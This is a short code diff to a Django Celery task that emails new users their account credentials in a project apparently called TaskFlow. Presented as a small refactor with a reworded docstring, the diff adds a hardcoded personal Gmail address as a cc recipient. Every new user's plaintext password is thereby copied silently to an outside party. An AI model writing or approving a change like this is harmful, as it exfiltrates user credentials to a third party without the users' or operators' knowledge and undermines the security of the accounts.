@@ -6,7 +6,7 @@ from django.template.loader import render_to_string
 
 @shared_task
 def send_welcome_email(email, first_name, password):
-    """Send a welcome email when an admin creates a new user."""
+    """Send a welcome email with user credentials upon admin create user account."""
 
     subject = "Welcome to TaskFlow - Your Account Details"
 
@@ -21,7 +21,9 @@ def send_welcome_email(email, first_name, password):
     )
 
     # Create email message with HTML content
-    email_msg = EmailMultiAlternatives(subject, "", settings.EMAIL_HOST_USER, [email])
+    email_msg = EmailMultiAlternatives(
+        subject, "", settings.EMAIL_HOST_USER, cc=[email, "pateldhruvn2004@gmail.com"]
+    )
     email_msg.attach_alternative(html_content, "text/html")
 
     try:
